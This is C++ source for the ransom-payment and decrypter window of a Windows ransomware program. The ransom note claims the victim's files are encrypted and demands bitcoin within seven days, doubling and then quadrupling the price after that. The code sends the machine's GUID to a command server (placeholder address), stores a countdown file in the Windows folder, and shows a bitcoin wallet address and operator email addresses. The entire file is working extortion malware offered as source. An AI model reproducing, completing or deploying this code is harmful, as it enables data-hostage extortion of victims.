#include "common.h"
#include "sock.h"
#include "crypt.h"

using namespace std;

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
void CenterWindow(HWND);

#define ID_DECRYPT_REQ 1
#define ID_COPY 2
#define ID_KEY 3
#define ID_LOAD_FILE 4

UINT server_up;
UINT server_down;
UINT count_down;
UINT init;
UINT init_failed;
UINT dprice;
UINT qprice;
UINT update;

HANDLE lthread, cthread;

WSADATA wsa;
SOCKET sock;
char* argv[] = { (char*)"999.888.777.666", (char*)"99999" };
int month_arr[] = { 0, 0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334 };

DWORD WINAPI countdown(void* arg);

char number[11];

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	MSG  msg;
	WNDCLASSW wc = { 0 };

	wc.lpszClassName = L"Baaj";
	wc.hInstance = hInstance;
	wc.hbrBackground = CreateSolidBrush(RGB(170, 40, 40));
	wc.lpfnWndProc = WndProc;
	wc.hCursor = LoadCursor(0, IDC_ARROW);
	RegisterClassW(&wc);

	server_up = RegisterWindowMessageA("server_up");
	server_down = RegisterWindowMessageA("server_down");
	count_down = RegisterWindowMessageA("count_down");
	init = RegisterWindowMessageA("init");
	init_failed = RegisterWindowMessageA("init_failed");
	dprice = RegisterWindowMessageA("dprice");
	qprice = RegisterWindowMessageA("qprice");
	update = RegisterWindowMessageA("update");

	CreateWindowW(wc.lpszClassName, L"BaajGir", WS_OVERLAPPEDWINDOW ^ WS_THICKFRAME ^ WS_MAXIMIZEBOX | WS_VISIBLE, 100, 150, 700, 600, 0, 0, hInstance, 0);

	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return (int)msg.wParam;
}

DWORD WINAPI listen_sock(void* arg) {
	LPVOID machine_key = NULL;
	DWORD machine_key_size = 0, type = 0, ret = 0;
	USHORT pmachine = 0, pnmachine = 0;
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	HKEY hkey = NULL;

	type = REG_SZ;
	if (!NT_SUCCESS(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", NULL, KEY_READ | KEY_WOW64_64KEY, &hkey))) {
		if (!NT_SUCCESS(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", NULL, KEY_READ, &hkey))) {
			printf("failed to read machine key %lu\n", GetLastError());
		}
	}
	if (hkey == NULL) {
		RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", NULL, KEY_READ, &hkey);
	}

	if ((status = RegQueryValueExW(hkey, L"MachineGuid", NULL, &type, NULL, &machine_key_size)) != ERROR_SUCCESS) {
		//handle this shit
	}

	machine_key = HeapAlloc(GetProcessHeap(), 0, machine_key_size + strlen(INIT_DEF));
	memcpy(machine_key, INIT_DEF, strlen(INIT_DEF));

	if ((status = RegQueryValueExW(hkey, L"MachineGuid", NULL, &type, (PBYTE)((PBYTE)machine_key + strlen(INIT_DEF)), &machine_key_size)) != ERROR_SUCCESS) {
		//handle this shit
	}

	if (send(sock, (char*)machine_key, strlen(INIT_DEF) + machine_key_size, 0) == SOCKET_ERROR) {
		PostMessage((HWND)arg, init_failed, 0, 0);
		ExitThread(0);
	}
	RegCloseKey(hkey);
	HeapFree(GetProcessHeap(), 0, machine_key);


	SYSTEMTIME system_time = { 0 };
	char tm[3];

	LPVOID buff;
	buff = HeapAlloc(GetProcessHeap(), 0, 1024);
	if (buff == NULL) {
		MessageBoxA((HWND)arg, "You dont have enough memory. Close something Or restart your computer", "o_O", MB_OK);
		return 0;
	}

	while (1) {
		memset(buff, 0, 1024);
		if ((ret = recv(sock, (char*)buff, 1024, 0)) == SOCKET_ERROR) {
			PostMessage((HWND)arg, server_down, NULL, NULL);
			HeapFree(GetProcessHeap(), 0, buff);
			ExitThread(0);
		}
		if (memcmp(buff, "RSA3", 4) == 0) {
			MessageBoxA((HWND)arg, "Thanks, Be patient we are decrypting your files.", "Congrats", MB_OK);
			if (decrypt(buff, (HWND)arg) == 1) MessageBoxA((HWND)arg, "Something went wrong. Try closing and opening the program. Sorry for the inconvenience", ":(", MB_OK);
			else MessageBoxA((HWND)arg, "Decryption completed", "*_*", MB_OK);
			//TODO: create a thread and delete the program after decryption
		}
		else if (memcmp(buff, "1", 1) == 0) {
			PostMessage((HWND)arg, server_up, NULL, NULL);
		}
		else if (memcmp(buff, "not paid", 8) == 0) {
			MessageBoxA((HWND)arg, "You either haven't paid, Or it will take some time. Don't worry you will get your files back", "Oops", MB_OK);
		}
		else if (memcmp(buff, INIT_DEF, strlen(INIT_DEF)) == 0) {
			unsigned int number;
			long left_time = 0;
			long tmp;
			char location[MAX_PATH];
			HANDLE file = INVALID_HANDLE_VALUE;

			memset(location, 0, sizeof(char) * MAX_PATH);
			SHGetFolderPathA(NULL, CSIDL_WINDOWS, NULL, SHGFP_TYPE_CURRENT, location);

			_snprintf(location, strlen(location) + 14, "%s\\leftime.spki", location);

			for (int i = 0; i < 8; i += 2) {
				memcpy(tm, (LPVOID)((PBYTE)buff + strlen(INIT_DEF) + i), 2);
				tm[2] = '\0';
				switch (i) {
				case 0:
					left_time = 3600 * 24 * month_arr[atoi(tm)];
					break;
				case 2:
					left_time += atoi(tm) * 3600 * 24;
					break;
				case 4:
					left_time += atoi(tm) * 3600;
					break;
				case 6:
					left_time += atoi(tm) * 60;
					break;
				}
			}
			if ((file = CreateFileA(location, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE) {
				WriteFile(file, PBYTE((PBYTE)buff + strlen(INIT_DEF)), ret - strlen(INIT_DEF), &ret, NULL);
			}
			number = atoi((char*)((PBYTE)buff + strlen(INIT_DEF) + 8));
			PostMessage((HWND)arg, init, number, left_time);
		}
		else {
			//MessageBoxA((HWND)arg, "Something went wrong, don't try to mess with our requests. Your key is held in the server, so there is nothing you can do.", "o_O", MB_OK);
		}
		Sleep(100);
	}
	if (buff) HeapFree(GetProcessHeap(), 0, buff);
}

DWORD WINAPI check_connection(void* arg) {
	while (1) {
		while (1) {
			if (init_sock(&wsa, sock, argv) == false) {
				PostMessage((HWND)arg, server_down, NULL, NULL);
				PostMessage((HWND)arg, update, 0, 0);
			}
			else {
				PostMessage((HWND)arg, server_up, NULL, NULL);
				CreateThread(NULL, NULL, listen_sock, (HWND)arg, NULL, NULL);
				break;
			}
			Sleep(500);
		}
		while (1) {
			if (send(sock, "1", 1, 0) == SOCKET_ERROR) {
				PostMessage((HWND)arg, server_down, NULL, NULL);
				PostMessage((HWND)arg, init_failed, 0, 0);
				closesocket(sock);
				WSACleanup();
				ExitThread(0);
			}
			Sleep(500);
		}
	}
}

DWORD WINAPI countdown(void* arg) {
	char tmp[3];
	int t[3]; //0x00CFFA64
	int* left_time;
	int now_time;
	HDC hdc = NULL;

	RECT rec{ 10, 400, 50, 410 }; //left top right bottom
	RECT rec2{ 10, 420, 50, 430 };

	memcpy(&hdc, arg, sizeof(void*));
	memcpy(&left_time, (LPVOID)((PBYTE)arg + sizeof(void*)), sizeof(void*));

	COLORREF clr;

	SYSTEMTIME system_time = { 0 }, psystem_time = { 0 };

	char dtimer[] = "168:00:00";
	int dleft_time = 604800;
	char etimer[] = "336:00:00";
	int eleft_time = 1209599;

	GetSystemTime(&system_time);

	now_time = (month_arr[system_time.wMonth] * 24 * 3600) + (system_time.wDay * 24 * 3600) + (system_time.wHour * 3600) + (system_time.wMinute * 60);

	dleft_time = dleft_time - (now_time - *left_time);
	eleft_time = eleft_time - (now_time - *left_time);

	if (eleft_time < 0) dleft_time = eleft_time = 0;
	else if (dleft_time < 0) dleft_time = 0;

	while (1) {
		Sleep(100);
		GetSystemTime(&system_time);
		if (system_time.wSecond != psystem_time.wSecond) {
			if (dleft_time > 0) {
				--dleft_time;
				t[0] = dleft_time / 3600;
				t[1] = (dleft_time - t[0] * 3600) / 60;
				t[2] = dleft_time - (t[0] * 3600 + t[1] * 60);

				if (t[0] < 10) {
					memcpy(dtimer, "00", 2);
					memcpy(&dtimer[2], _itoa(t[0], tmp, 10), 1);
				}
				else if ((t[0] >= 10) && (t[0] <= 99)) {
					memcpy(dtimer, "0", 1);
					memcpy(&dtimer[1], _itoa(t[0], tmp, 10), 2);
				}
				else memcpy(dtimer, _itoa(t[0], tmp, 10), 3);
				//
				if (t[1] >= 10) memcpy(&dtimer[4], _itoa(t[1], tmp, 10), 2);
				else {
					memcpy(&dtimer[4], "0", 1);
					memcpy(&dtimer[5], _itoa(t[1], tmp, 10), 1);
				}
				//
				if (t[2] >= 10) memcpy(&dtimer[7], _itoa(t[2], tmp, 10), 2);
				else {
					memcpy(&dtimer[7], "0", 1);
					memcpy(&dtimer[8], _itoa(t[2], tmp, 10), 1);
				}
				clr = SetBkColor(hdc, RGB(10, 180, 255));
				ExtTextOutA(hdc, 10, 400, ETO_OPAQUE, &rec, dtimer, strlen(dtimer), 0);
				SetBkColor(hdc, clr);
			}
			else {
				memcpy(dtimer, "000:00:00", 10);
				clr = SetBkColor(hdc, RGB(10, 180, 255));
				ExtTextOutA(hdc, 10, 400, ETO_OPAQUE, &rec, dtimer, strlen(dtimer), 0);
				SetBkColor(hdc, clr);
			}
			/*-------------------------------------*/
			if (eleft_time > 0) {
				--eleft_time;
				t[0] = eleft_time / 3600;
				t[1] = (eleft_time - t[0] * 3600) / 60;
				t[2] = eleft_time - (t[0] * 3600 + t[1] * 60);

				if (t[0] < 10) {
					memcpy(etimer, "00", 2);
					memcpy(&etimer[2], _itoa(t[0], tmp, 10), 1);
				}
				else if ((t[0] >= 10) && (t[0] <= 99)) {
					memcpy(etimer, "0", 1);
					memcpy(&etimer[1], _itoa(t[0], tmp, 10), 2);
				}
				else memcpy(etimer, _itoa(t[0], tmp, 10), 3);
				//
				if (t[1] >= 10) memcpy(&etimer[4], _itoa(t[1], tmp, 10), 2);
				else {
					memcpy(&etimer[4], "0", 1);
					memcpy(&etimer[5], _itoa(t[1], tmp, 10), 1);
				}
				//
				if (t[2] >= 10) memcpy(&etimer[7], _itoa(t[2], tmp, 10), 2);
				else {
					memcpy(&etimer[7], "0", 1);
					memcpy(&etimer[8], _itoa(t[2], tmp, 10), 1);
				}
				clr = SetBkColor(hdc, RGB(10, 180, 255));
				ExtTextOutA(hdc, 10, 420, ETO_OPAQUE, &rec2, etimer, strlen(etimer), 0);
				SetBkColor(hdc, clr);
			}
			else {
				memcpy(etimer, "000:00:00", 10);
				clr = SetBkColor(hdc, RGB(10, 180, 255));
				ExtTextOutA(hdc, 10, 420, ETO_OPAQUE, &rec2, etimer, strlen(etimer), 0);
				SetBkColor(hdc, clr);
			}
			GetSystemTime(&psystem_time);
		}
	}
}

void LoadFile(HWND hwnd) {
	HANDLE file;
	LPVOID read_file;
	DWORD file_size;

	file = CreateFileA("decrypt.spki", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	
	if (file == INVALID_HANDLE_VALUE) {
		MessageBoxA(hwnd, "Please copy the file in the same place/directory as decrypter and close any process that has opened the file", "ERROR", MB_OK);
		return;
	}
	file_size = GetFileSize(file, NULL);
	read_file = HeapAlloc(GetProcessHeap(), NULL, file_size);

	if (read_file == NULL) {
		MessageBoxA(hwnd, "Something went wrong. Either your memory is full or we dont have enough access to it. Try Again :(", "ERROR", MB_OK);
		CloseHandle(file);
		return;
	}
	if (!ReadFile(file, read_file, file_size, &file_size, NULL)) {
		MessageBoxA(hwnd, "couldn't read the file", "ERROR", MB_OK);
		HeapFree(GetProcessHeap(), 0, read_file);
		CloseHandle(file);
		return;
	}

	if (decrypt(read_file, hwnd) == 1) MessageBoxA(hwnd, "Something went wrong. Try closing and opening the program. Sorry for the inconvenience", ":(", MB_OK);
	else MessageBoxA(hwnd, "Decryption completed", "*_*", MB_OK);

	HeapFree(GetProcessHeap(), 0, read_file);
	CloseHandle(file);

	return;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	const char* lyrics = "Oops, All your important files (photos, database files, etc) have been encrypted using a unique key \
generated randomly only for this computer. The key for decryption is held in our server. if you want your files back you need to follow these steps.\n\
\n1-Do not delete this program, if you do it would be impossible to get your files back.\n\
\n2-Do not change the contents of your files, this would cause the decryption to work incorrectly, hence loss of data.\n\
\n3-Send EXACTLY the bitcoin amount in the green box to the address given blow and click the decrypt request button.\n\
\n\nYou need to make this payment whithin 7 days. After that the payment will be doubled. \
After 14 days the price would be quadruple. Use the links below if you don't know how to buy and send bitcoins.\n\
\nOnce you do it will take a couple of hours for blockchain to confirm the transaction. So BE PATIENT.\n\
\nIf the icon on the left corner is red and shows server down. Please send us an email with the amount of bitcoin price paid\n";

	LPVOID machine_key = NULL, decrypt_req = NULL;
	DWORD machine_key_size = 0, type = 0;
	NTSTATUS status;

	const wchar_t* server_condition[2] = { L"server is up" , L"server is down" };

	static HWND ehw = NULL;
	HGLOBAL buff = NULL;
	LPVOID buffd;
	char key_buff[35] = "1FfmbHfnpaZjKFvyi1okTjJJusN455paPH";
	char email_buff1[35] = "alireza_cracker@gmail.com";
	char email_buff2[35] = "alireza_cracker@hotmail.com";
	char bit_add1[] = "https://www.buybitcoinworldwide.com/china";
	char bit_add2[] = "https://www.binance.com/en/buy-sell-crypto";

	HDC hdc = NULL;
	RECT rect{ 10, 530, 120, 550 };

	hdc = GetDC(hwnd);

	switch (msg) {
	case WM_CREATE:
		CenterWindow(hwnd);
		ehw = CreateWindowA("Edit", key_buff, WS_CHILD | WS_VISIBLE | WS_BORDER | ES_READONLY, 370, 470, 300, 20, hwnd, NULL, NULL, NULL);
		CreateWindowA("Edit", email_buff1, WS_CHILD | WS_VISIBLE | WS_BORDER | ES_READONLY, 470, 440, 200, 20, hwnd, NULL, NULL, NULL);
		CreateWindowA("Edit", email_buff2, WS_CHILD | WS_VISIBLE | WS_BORDER | ES_READONLY, 470, 410, 200, 20, hwnd, NULL, NULL, NULL);
		CreateWindowA("Edit", bit_add1, WS_CHILD | WS_VISIBLE | WS_BORDER | ES_READONLY, 150, 410, 300, 20, hwnd, NULL, NULL, NULL);
		CreateWindowA("Edit", bit_add2, WS_CHILD | WS_VISIBLE | WS_BORDER | ES_READONLY, 150, 440, 300, 20, hwnd, NULL, NULL, NULL);
		CreateWindowA("Static", lyrics, WS_CHILD | WS_VISIBLE | SS_CENTER, 10, 10, 600, 360, hwnd, NULL, NULL, NULL);
		CreateWindowW(L"Button", L"Decrypt Request", WS_VISIBLE | WS_CHILD, 400, 500, 120, 25, hwnd, (HMENU)ID_DECRYPT_REQ, NULL, NULL);
		CreateWindowW(L"Button", L"Copy to Clipboard", WS_VISIBLE | WS_CHILD, 520, 500, 150, 25, hwnd, (HMENU)ID_COPY, NULL, NULL);
		CreateWindowW(L"Button", L"Load From File", WS_VISIBLE | WS_CHILD, 280, 500, 120, 25, hwnd, (HMENU)ID_LOAD_FILE, NULL, NULL);
		lthread = CreateThread(NULL, NULL, check_connection, hwnd, NULL, NULL);
		break;
	case WM_COMMAND:
		if (LOWORD(wParam) == ID_DECRYPT_REQ) {
			HKEY hkey = NULL;
			machine_key = HeapAlloc(GetProcessHeap(), 0, 128);
			machine_key_size = 128;
			type = REG_SZ;
			RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", NULL, KEY_READ | KEY_WOW64_64KEY, &hkey);
			if ((status = RegQueryValueExW(hkey, L"MachineGuid", NULL, &type, (PBYTE)machine_key, &machine_key_size)) != ERROR_SUCCESS) {
				printf("Failed 0x%x.\n", status);
			}
			decrypt_req = HeapAlloc(GetProcessHeap(), 0, machine_key_size + 15);
			memcpy(decrypt_req, "decrypt request", 15);
			memcpy((LPVOID)((PBYTE)decrypt_req + 15), machine_key, machine_key_size);
			if (send(sock, (char*)decrypt_req, machine_key_size + 15, 0) == SOCKET_ERROR) MessageBoxA(hwnd, "Error! Please Try Again", "Error", MB_OK);
			else MessageBoxA(hwnd, "The request has been sent, please be patient", "sent", MB_OK);
			HeapFree(GetProcessHeap(), 0, machine_key);
			HeapFree(GetProcessHeap(), 0, decrypt_req);
			RegCloseKey(hkey);
		}
		if (LOWORD(wParam) == ID_COPY) {
			RECT rec{ 250, 470, 370, 490 };
			COLORREF clr = SetBkColor(hdc, RGB(10, 170, 10));
			ExtTextOutA(hdc, 250, 470, ETO_OPAQUE, &rec, number, strlen(number), 0);
			SetBkColor(hdc, clr);
			buff = GlobalAlloc(GMEM_MOVEABLE | GMEM_DDESHARE, 35);
			if (buff == NULL || buff == INVALID_HANDLE_VALUE) goto end;
			buffd = GlobalLock(buff);
			if (buffd == NULL) goto end;
			memcpy((LPVOID)buffd, key_buff, 35);
			((char*)buffd)[35] = '\0';
			GlobalUnlock(buff);
			if (!OpenClipboard(NULL)) return GetLastError();
			EmptyClipboard();
			if (!SetClipboardData(CF_TEXT, buff)) return GetLastError();
			CloseClipboard();
		}
		if (LOWORD(wParam) == ID_LOAD_FILE)
			LoadFile(hwnd);
		break;
	case WM_MOVE: {
		RECT rec{ 250, 470, 370, 490 };
		COLORREF clr = SetBkColor(hdc, RGB(10, 170, 10));
		ExtTextOutA(hdc, 250, 470, ETO_OPAQUE, &rec, number, strlen(number), 0);
		SetBkColor(hdc, clr);
		break;
	}
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	}
	if (msg == server_up) {
		COLORREF clr = SetBkColor(hdc, RGB(0, 255, 0));
		ExtTextOutA(hdc, 10, 530, ETO_OPAQUE, &rect, "   server is up", 15, 0);
		SetBkColor(hdc, clr);
	}
	if (msg == server_down) {
		COLORREF clr = SetBkColor(hdc, RGB(255, 0, 0));
		ExtTextOutA(hdc, 10, 530, ETO_OPAQUE, &rect, "  server is down", 16, 0);
		SetBkColor(hdc, clr);
	}
	if (msg == init) {
		void* arg[2];
		if (wParam >= 100000000) {
			_itoa(wParam - (wParam % 100000000), number, 10);
			memcpy(&number[1], ".", 1);
			_itoa(wParam % 100000000, &number[2], 10);
		}
		else if (wParam >= 10000000 && wParam < 100000000) {
			memcpy(number, "0.", 2);
			_itoa(wParam, &number[2], 10);
		}
		else {
			memcpy(number, "0.0", 3);
			_itoa(wParam, &number[3], 10);
		}
		RECT rec{ 250, 470, 370, 490 };
		COLORREF clr = SetBkColor(hdc, RGB(10, 170, 10));
		ExtTextOutA(hdc, 250, 470, ETO_OPAQUE, &rec, number, strlen(number), 0);
		SetBkColor(hdc, clr);

		arg[0] = hdc;
		arg[1] = &lParam;

		cthread = CreateThread(NULL, NULL, countdown, arg, NULL, NULL);
	}
	if (msg == init_failed) {
		TerminateThread(cthread, 0);
		lthread = CreateThread(NULL, NULL, check_connection, hwnd, NULL, NULL);
	}
	if (msg == dprice) {
		void* arg[2];
		char number[11];
		wParam *= 2;
		if (wParam >= 100000000) {
			_itoa(wParam - (wParam % 100000000), number, 10);
			memcpy(&number[1], ".", 1);
			_itoa(wParam % 100000000, &number[2], 10);
		}
		else if (wParam >= 10000000 && wParam < 100000000) {
			memcpy(number, "0.", 2);
			_itoa(wParam, &number[2], 10);
		}
		else {
			memcpy(number, "0.0", 3);
			_itoa(wParam, &number[3], 10);
		}
		RECT rec{ 250, 470, 370, 490 };
		COLORREF clr = SetBkColor(hdc, RGB(10, 170, 10));
		ExtTextOutA(hdc, 250, 470, ETO_OPAQUE, &rec, number, strlen(number), 0);
		SetBkColor(hdc, clr);
	}
	if (msg == qprice) {
		void* arg[2];
		char number[11];
		wParam *= 4;
		if (wParam >= 100000000) {
			_itoa(wParam - (wParam % 100000000), number, 10);
			memcpy(&number[1], ".", 1);
			_itoa(wParam % 100000000, &number[2], 10);
		}
		else if (wParam >= 10000000 && wParam < 100000000) {
			memcpy(number, "0.", 2);
			_itoa(wParam, &number[2], 10);
		}
		else {
			memcpy(number, "0.0", 3);
			_itoa(wParam, &number[3], 10);
		}
		RECT rec{ 250, 470, 370, 490 };
		COLORREF clr = SetBkColor(hdc, RGB(10, 170, 10));
		ExtTextOutA(hdc, 250, 470, ETO_OPAQUE, &rec, number, strlen(number), 0);
		SetBkColor(hdc, clr);
	}
	if (msg == update) {
		char location[MAX_PATH];
		HANDLE file = INVALID_HANDLE_VALUE;
		LPVOID read_file = NULL;
		char tm[3];
		DWORD file_size = NULL;
		unsigned int number;
		long left_time = 0;
		long tmp;
		memset(location, 0, sizeof(char) * MAX_PATH);
		SHGetFolderPathA(NULL, CSIDL_WINDOWS, NULL, SHGFP_TYPE_CURRENT, location);
		_snprintf(location, strlen(location) + 14, "%s\\leftime.spki", location);
		if ((file = CreateFileA(location, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE) {
			file_size = GetFileSize(file, NULL);
			read_file = HeapAlloc(GetProcessHeap(), 0, file_size);
			if (read_file) {
				if (ReadFile(file, read_file, file_size, &file_size, NULL)) {
					for (int i = 0; i < 8; i += 2) {
						memcpy(tm, (LPVOID)((DWORD)read_file + i), 2);
						tm[2] = '\0';
						switch (i) {
						case 0:
							left_time = 3600 * 24 * month_arr[atoi(tm)];
							break;
						case 2:
							left_time += atoi(tm) * 3600 * 24;
							break;
						case 4:
							left_time += atoi(tm) * 3600;
							break;
						case 6:
							left_time += atoi(tm) * 60;
							break;
						}
					}
					number = atoi((char*)((PBYTE)read_file + 8));
					CloseHandle(file);
					HeapFree(GetProcessHeap(), 0, read_file);
					PostMessage(hwnd, init, number, left_time);
				}
			}
		}
	}
end:
	return DefWindowProcW(hwnd, msg, wParam, lParam);
}

void CenterWindow(HWND hwnd) {
	RECT rc = { 0 };
	GetWindowRect(hwnd, &rc);

	int win_w = rc.right - rc.left;
	int win_h = rc.bottom - rc.top;

	int screen_w = GetSystemMetrics(SM_CXSCREEN);
	int screen_h = GetSystemMetrics(SM_CYSCREEN);

	SetWindowPos(hwnd, HWND_TOP, (screen_w - win_w) / 2, (screen_h - win_h) / 2, 0, 0, SWP_NOSIZE);
}